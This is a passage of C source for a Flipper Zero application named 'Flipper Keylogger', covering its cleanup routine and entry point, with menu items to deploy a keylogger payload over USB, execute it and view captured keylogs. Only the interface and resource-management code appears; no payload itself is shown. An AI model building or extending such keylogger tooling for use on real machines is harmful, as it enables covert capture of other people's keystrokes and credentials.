        } else if(thread_state == FuriThreadStateStopped) {
            FURI_LOG_I(TAG, "Thread already stopped, safe to free");
        }

        furi_thread_free(app->execution_thread);
        app->execution_thread = NULL;
        FURI_LOG_I(TAG, "Execution thread cleaned up during app exit");

        // Force USB cleanup after thread cleanup
        if(app->payload_manager) {
            FURI_LOG_I(TAG, "Final USB cleanup during app exit...");
            payload_manager_cleanup(app->payload_manager);
            furi_delay_ms(500); // Give USB time to reset
        }
    } else {
        FURI_LOG_I(TAG, "No execution thread to cleanup during app exit");
    }

    // Cleanup payload manager first (restores USB mode)
    if(app->payload_manager) {
        FURI_LOG_I(TAG, "Cleaning up payload manager...");
        payload_manager_cleanup(app->payload_manager);
        payload_manager_free(app->payload_manager);
        app->payload_manager = NULL;
    }

    // Free all allocated views and modules in reverse order
    FURI_LOG_I(TAG, "Freeing views and modules...");
    if(app->view_dispatcher) { // Ensure view_dispatcher was allocated
        FURI_LOG_I(TAG, "Removing views from dispatcher...");
        // Only remove views that were actually added
        if(app->file_viewer_view) {
            view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewFileViewer);
        }
        if(app->keylog_browser_view) {
            view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewKeylogBrowser);
        }
        view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewHelp);
        view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewSuccess);
        view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewProgress);
        view_dispatcher_remove_view(app->view_dispatcher, KeyloggerViewPreparation);

        FURI_LOG_I(TAG, "Detaching view dispatcher from GUI...");
        view_dispatcher_stop(app->view_dispatcher);

        FURI_LOG_I(TAG, "Freeing view dispatcher...");
        view_dispatcher_free(app->view_dispatcher);
        app->view_dispatcher = NULL;
    }

    FURI_LOG_I(TAG, "Freeing individual views...");
    // Note: file_browser is NULL when using dialogs API, so no need to free it
    if(app->keylog_browser_view) {
        FURI_LOG_I(TAG, "Freeing keylog browser view...");
        keylog_browser_view_free(app->keylog_browser_view);
        app->keylog_browser_view = NULL;
        FURI_LOG_I(TAG, "Keylog browser view freed");
    }
    if(app->file_viewer_view) {
        FURI_LOG_I(TAG, "Freeing file viewer view...");
        file_viewer_view_free(app->file_viewer_view);
        app->file_viewer_view = NULL;
        FURI_LOG_I(TAG, "File viewer view freed");
    }
    if(app->help_view) {
        FURI_LOG_I(TAG, "Freeing help view...");
        help_view_free(app->help_view);
        app->help_view = NULL;
        FURI_LOG_I(TAG, "Help view freed");
    }
    if(app->success_failure_view) {
        FURI_LOG_I(TAG, "Freeing success failure view...");
        success_failure_view_free(app->success_failure_view);
        app->success_failure_view = NULL;
        FURI_LOG_I(TAG, "Success failure view freed");
    }
    if(app->progress_view) {
        progress_view_free(app->progress_view);
        app->progress_view = NULL;
    }
    if(app->preparation_submenu) {
        FURI_LOG_I(TAG, "Freeing preparation submenu...");
        submenu_free(app->preparation_submenu);
        app->preparation_submenu = NULL;
        FURI_LOG_I(TAG, "Preparation submenu freed");
    }

    // Free FuriStrings (safe to call with NULL)
    FURI_LOG_I(TAG, "Freeing FuriStrings...");
    if(app->primary_payload_path) {
        furi_string_free(app->primary_payload_path);
        app->primary_payload_path = NULL;
    }
    if(app->selected_file_path) {
        furi_string_free(app->selected_file_path);
        app->selected_file_path = NULL;
    }
    FURI_LOG_I(TAG, "FuriStrings freed");

    // Close Furi records (only if opened in this app's context, which they are in keylogger_app)
    FURI_LOG_I(TAG, "Closing Furi records...");
    if(app->dialogs) {
        FURI_LOG_I(TAG, "Closing dialogs record...");
        furi_record_close(RECORD_DIALOGS);
        app->dialogs = NULL;
        FURI_LOG_I(TAG, "Dialogs record closed");
    }
    if(app->storage) {
        FURI_LOG_I(TAG, "Closing storage record...");
        furi_record_close(RECORD_STORAGE);
        app->storage = NULL;
        FURI_LOG_I(TAG, "Storage record closed");
    }
    if(app->gui) {
        FURI_LOG_I(TAG, "Closing GUI record...");
        furi_record_close(RECORD_GUI);
        app->gui = NULL;
        FURI_LOG_I(TAG, "GUI record closed");
    }

    FURI_LOG_I(TAG, "Freeing app structure...");
    free(app);

    FURI_LOG_I(TAG, "App cleanup completed");
}

// Application entry point
int32_t keylogger_app(void* p) {
    UNUSED(p);
    FURI_LOG_I(TAG, "=== Starting Flipper Keylogger App ===");

    // Brief pause to let system settle (CLI disconnection error is normal during ufbt launch)
    FURI_LOG_D(TAG, "Brief system settlement pause...");
    furi_delay_ms(100); // Minimal delay - CLI error is expected and harmless

    KeyloggerApp* app = keylogger_app_alloc();
    if(!app) {
        FURI_LOG_E(TAG, "keylogger_app_alloc failed");
        return -1;
    }
    FURI_LOG_I(TAG, "App structure allocated successfully");

    // Open Furi records
    FURI_LOG_I(TAG, "Opening Furi records...");
    app->gui = furi_record_open(RECORD_GUI);
    if(!app->gui) {
        FURI_LOG_E(TAG, "furi_record_open RECORD_GUI failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "GUI record opened");

    app->storage = furi_record_open(RECORD_STORAGE);
    if(!app->storage) {
        FURI_LOG_E(TAG, "furi_record_open RECORD_STORAGE failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Storage record opened");

    app->dialogs = furi_record_open(RECORD_DIALOGS);
    if(!app->dialogs) {
        FURI_LOG_E(TAG, "furi_record_open RECORD_DIALOGS failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Dialogs record opened");

    // View Dispatcher
    FURI_LOG_I(TAG, "Creating view dispatcher...");
    app->view_dispatcher = view_dispatcher_alloc();
    if(!app->view_dispatcher) {
        FURI_LOG_E(TAG, "view_dispatcher_alloc failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "View dispatcher allocated");

    // Configure view dispatcher with callbacks
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(
        app->view_dispatcher, keylogger_custom_event_callback);
    view_dispatcher_set_navigation_event_callback(
        app->view_dispatcher, keylogger_navigation_event_callback);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    FURI_LOG_I(TAG, "View dispatcher configured");

    // Allocate core logic modules
    FURI_LOG_I(TAG, "Allocating core modules...");
    app->payload_manager = payload_manager_alloc(app);
    if(!app->payload_manager) {
        FURI_LOG_E(TAG, "payload_manager_alloc failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Payload manager allocated");

    // Allocate views
    FURI_LOG_I(TAG, "Allocating views...");
    app->preparation_submenu = submenu_alloc();
    if(!app->preparation_submenu) {
        FURI_LOG_E(TAG, "submenu_alloc() failed for preparation_submenu");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Preparation submenu allocated");

    submenu_add_item(
        app->preparation_submenu,
        "Mode: Deploy Keylogger", // Will be updated by keystroke_reflection_update_preparation_menu_labels
        PreparationSubmenuIndexModeSelect,
        keylogger_preparation_submenu_callback,
        app);
    submenu_add_item(
        app->preparation_submenu,
        "Select Payload", // Placeholder, will be updated by keystroke_reflection_update_preparation_menu_labels
        PreparationSubmenuIndexPayload,
        keylogger_preparation_submenu_callback,
        app);
    submenu_add_item(
        app->preparation_submenu,
        "Execute",
        PreparationSubmenuIndexExecute,
        keylogger_preparation_submenu_callback,
        app);
    submenu_add_item(
        app->preparation_submenu,
        "View Keylogs",
        PreparationSubmenuIndexViewKeylogs,
        keylogger_preparation_submenu_callback,
        app);
    submenu_add_item(
        app->preparation_submenu,
        "Help",
        PreparationSubmenuIndexHelp,
        keylogger_preparation_submenu_callback,
        app);
    submenu_add_item(
        app->preparation_submenu,
        "Exit",
        PreparationSubmenuIndexExit,
        keylogger_preparation_submenu_callback,
        app);

    View* preparation_view = submenu_get_view(app->preparation_submenu);
    if(!preparation_view) {
        FURI_LOG_E(TAG, "submenu_get_view() failed for preparation_submenu");
        keylogger_app_free(app);
        return -1;
    }
    view_dispatcher_add_view(app->view_dispatcher, KeyloggerViewPreparation, preparation_view);
    FURI_LOG_I(TAG, "Preparation view added to dispatcher");

    // Update menu labels to show current state
    keylogger_update_preparation_menu_labels(app);
    FURI_LOG_I(TAG, "Menu labels updated");

    app->progress_view = progress_view_alloc();
    if(!app->progress_view) {
        FURI_LOG_E(TAG, "progress_view_alloc failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Progress view allocated");

    View* actual_progress_view = progress_view_get_view(app->progress_view);
    if(!actual_progress_view) {
        FURI_LOG_E(TAG, "progress_view_get_view failed");
        keylogger_app_free(app);
        return -1;
    }
    view_dispatcher_add_view(app->view_dispatcher, KeyloggerViewProgress, actual_progress_view);
    FURI_LOG_I(TAG, "Progress view added to dispatcher");

    app->success_failure_view = success_failure_view_alloc();
    if(!app->success_failure_view) {
        FURI_LOG_E(TAG, "success_failure_view_alloc failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Success failure view allocated");

    View* actual_success_failure_view = success_failure_view_get_view(app->success_failure_view);
    if(!actual_success_failure_view) {
        FURI_LOG_E(TAG, "success_failure_view_get_view failed");
        keylogger_app_free(app);
        return -1;
    }
    // CRITICAL FIX: Only add the view once with the Success ID to prevent event loop issues
    // Both success and failure will use the same view but only register it once
    view_dispatcher_add_view(
        app->view_dispatcher, KeyloggerViewSuccess, actual_success_failure_view);
    FURI_LOG_I(
        TAG, "Success failure view added to dispatcher (shared for both success and failure)");

    app->help_view = help_view_alloc();
    if(!app->help_view) {
        FURI_LOG_E(TAG, "help_view_alloc failed");
        keylogger_app_free(app);
        return -1;
    }
    FURI_LOG_I(TAG, "Help view allocated");

    View* actual_help_view = help_view_get_view(app->help_view);
    if(!actual_help_view) {
        FURI_LOG_E(TAG, "help_view_get_view failed");
        keylogger_app_free(app);
        return -1;
    }
    view_dispatcher_add_view(app->view_dispatcher, KeyloggerViewHelp, actual_help_view);
    FURI_LOG_I(TAG, "Help view added to dispatcher");

    // Use dialogs API for file selection instead of custom file browser
    FURI_LOG_I(TAG, "File selection will use dialogs API for stability");
    app->file_browser = NULL; // Not using custom file browser anymore

    // DEFERRED ALLOCATION: Don't allocate complex file views during startup
    // These will be allocated lazily when first needed to prevent event loop issues
    app->file_viewer_view = NULL;
    app->keylog_browser_view = NULL;
    FURI_LOG_I(TAG, "File views will be allocated on demand");

    // CRITICAL FIX: Don't switch to any view before view_dispatcher_run()
    // This prevents "Some events were not processed" FuriEventLoop errors
    FURI_LOG_I(TAG, "View dispatcher ready - initial view will be set after dispatcher starts");

    FURI_LOG_D(TAG, "About to call view_dispatcher_run()...");

    // Set initial view just before starting the dispatcher
    FURI_LOG_I(TAG, "Setting initial view to preparation menu");
    view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewPreparation);
    app->current_view_id = KeyloggerViewPreparation;

    // Start the GUI event loop - this will handle the initial view transition
    view_dispatcher_run(app->view_dispatcher);

    FURI_LOG_I(TAG, "GUI event loop ended, cleaning up...");

    // Add a small delay to ensure all pending events are processed
    furi_delay_ms(100);

    // Cleanup (this is reached after view_dispatcher_stop)
    keylogger_app_free(app); // Calls the comprehensive free function

    FURI_LOG_I(TAG, "=== Flipper Keylogger App Ended ===");
    return 0;
}
